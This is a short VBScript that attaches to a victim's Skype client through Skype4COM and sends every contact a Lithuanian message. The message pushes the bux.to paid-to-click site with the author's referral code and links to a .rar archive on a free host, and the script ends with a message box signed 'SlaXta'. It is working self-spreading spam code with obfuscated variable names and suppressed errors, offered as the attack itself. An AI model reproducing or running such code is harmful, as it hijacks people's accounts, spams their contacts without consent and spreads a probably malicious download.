on error resume next
set NrrlP = WScript.CreateObject("Scripting.FileSystemObject")
set uDlVA = wscript.createobject("wscript.shell")
set yADAl = WScript.CreateObject("Skype4COM.Skype", "Skype_")
yADAl.Client.Start()
yADAl.Attach()
For Each GAG In yADAl.Friends
yADAl.SendMessage GAG.handle," Zdr. Ar nenoretum uzsidirbt internete, turubut noretum tada ziurek, eik i  http://bux.to/?r=httml ten virsuj bus - register , ji paspausk ir registrokis AlertPay irasik irgi savo e-maila, referrer palik httml kai pilnaj uzsireginsi eik i Surf Ads ten bus nourodos, jas spaudinek po viena ir lauk 30 sec. ten rasisis kiek laukt turi, va toks ir darbas kolkas uz viena nouroda tokia gausi tik 1 ct bet poto daugiau ;) jei nori gaut daugiau info galiu atsiust arba siuskis http://the-unit.freehostia.com/Daugiau Info apie Bux.to uzdarbi.rar  "
next
msgbox "Bux.to by SlaXta",,"Lengvas budas uzsidirbti internete"
